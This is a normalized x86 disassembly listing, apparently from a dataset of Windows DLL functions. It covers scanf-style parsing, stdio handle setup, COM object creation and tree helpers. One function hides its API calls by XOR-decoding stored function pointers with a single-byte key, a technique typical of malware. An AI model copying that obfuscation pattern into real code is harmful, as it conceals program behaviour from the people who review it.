inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_100209ad
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_1007a6c3
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_10003602
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_1007a6c3
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_10003602
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_10078970
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_100209ad
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_100209ad
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_100209ad
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_1007b490
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_10003602
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_10012991
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_10035cd0
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_100209ad
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_10039bca
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_100209ad
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10003602
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_10003602
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007a66c
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007a6e3
mov [ ebp - 0x194 ] eax
movzx eax al
sub_1002cec0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x50 ] dx
lea edx [ ebp - 0x28 ]
mov eax 0x6e
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x48 ] 0x1
call sub_1000a6f0
mov ebx [ ebp - 0x50 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x30 ]
push eax
push 0x0
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x4c ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x44 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x3c ]
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x2c ] 0x0
call sub_1004e5d0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x34 ]
push edx
mov edx [ ebp - 0x30 ]
xor edi edi
mov [ ebp - 0x34 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov [ ebp - 0x2c ] 0x3
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x2c ] 0x6
jmp r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x34 ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x38 ]
push eax
call sub_10049460
mov ecx [ ebp - 0x38 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x2c ] 0x4
jmp r-xdata
sub_1002d040
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
mov esi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x4
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x20c ]
push edx
call [ StrCpyW@IAT ]
push ebx
lea ebx [ ebp - 0x20c ]
xor esi esi
call sub_1004a850
pop ebx
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x104 ] 0x0
mov [ eax + 0x10c ] 0x0
mov [ eax + 0x108 ] 0x1
mov eax [ eax + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_1002d110
mov eax ecx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
retn
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] edx
mov ecx [ eax ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
retn
jmp r-xdata
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov ecx edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
sub_1002d160
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov edi [ ebx ]
cmp edi [ eax ]
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_1002470e
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebx ] esi
call sub_100067d1
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
lea ecx [ ebp + 0x8 ]
call sub_1002470e
pop esi
inc eax
mov [ esi + 0x4 ] eax
sub_1002d1db
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1001742d
pop ecx
push eax
call sub_10055977
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1002d250
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_1002d2c5
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10025450
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10025450
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1002d380
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x6c
call sub_1001bb80
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_1006b860
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
mov ecx 0x104
call sub_10067840
test eax eax
jns r-xdata
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x5
pop edi
mov esp ebp
pop ebp
retn
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
je r-xdata
lea edx [ edi + 0x1 ]
cmp edx 0x7ffffffe
jbe r-xdata
push esi
mov eax 0x104
mov ecx ebx
call sub_1006b860
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
push edx
mov ecx 0x104
call sub_10067840
test eax eax
jns r-xdata
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
sub_1002d490
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1002d54a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_10025450
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_10025450
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
